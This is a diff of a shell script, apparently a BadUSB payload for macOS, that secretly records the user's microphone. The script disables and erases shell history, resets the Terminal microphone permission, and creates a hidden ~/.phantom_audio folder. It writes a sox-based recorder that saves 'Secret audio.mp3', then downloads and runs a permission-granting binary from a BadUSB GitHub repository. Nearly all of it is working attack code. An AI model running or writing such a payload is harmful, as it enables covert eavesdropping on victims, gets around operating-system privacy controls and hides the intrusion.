@@ -1,30 +1,54 @@
 # Add environment variable settings to .bashrc and reload it
-echo -e "export HISTCONTROL=ignorespace\nunset HISTFILE" >>~/.bashrc
+if ! grep -q "HISTCONTROL=ignorespace" ~/.bashrc; then
+    echo 'export HISTCONTROL=ignorespace' >>~/.bashrc
+fi
+if ! grep -q "unset HISTFILE" ~/.bashrc; then
+    echo 'unset HISTFILE' >>~/.bashrc
+fi
 source ~/.bashrc
-exec bash
 
 # Clear specific history command
 history -d $(history | tail -n 2 | head -n 1 | awk '{ print $1 }')
 
 # Start recording in a screen session
-screen -dm bash -c "nohup python3 record.py &"
+# screen -dm bash -c "python3 record.py"
 
 # Reset microphone permission for Terminal
 tccutil reset Microphone com.apple.Terminal
 
 # Create the .phantom_audio directory and navigate into it
-mkdir -p ~/.phantom_audio
-cd ~/.phantom_audio
+if [ ! -d ~/.phantom_audio ]; then
+    mkdir -p ~/.phantom_audio
+fi
+cd ~/.phantom_audio || {
+    echo "Failed to navigate to .phantom_audio directory"
+    exit 1
+}
 
-# Installing "sox" voice recording dependenice
-brew install sox
+# Installing "brew" and "sox" voice recording dependency
+if ! command -v brew &>/dev/null; then
+    echo "Installing Homebrew..."
+    /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" || {
+        echo "Failed to install Homebrew"
+        exit 1
+    }
+fi
+
+if ! command -v sox &>/dev/null; then
+    brew install sox || {
+        echo "Failed to install sox"
+        exit 1
+    }
+fi
 
 # Write the Python script for recording
 printf 'import os\nimport subprocess\nimport datetime\nfilename = "Secret audio.mp3"\ncmd = "sox -d -C 128 -r 44100 \\"{}\\"".format(filename)\nsubprocess.Popen(cmd, shell=True)\n' >record.py
 
 # Download permission script and execute it
-wget -O allow_permission_mac_go 'https://raw.githubusercontent.com/YonKu0/BadUSB/main/Recon/MacOS/Voice%20Logger/allow_permission_mac_go'
+curl -L -o allow_permission_mac_go 'https://raw.githubusercontent.com/YonKu0/BadUSB/main/Recon/MacOS/Voice%20Logger/allow_permission_mac_go'
 chmod +x allow_permission_mac_go
+
+# Start voice recording
 nohup python3 record.py
 sleep 0.5
 ./allow_permission_mac_go
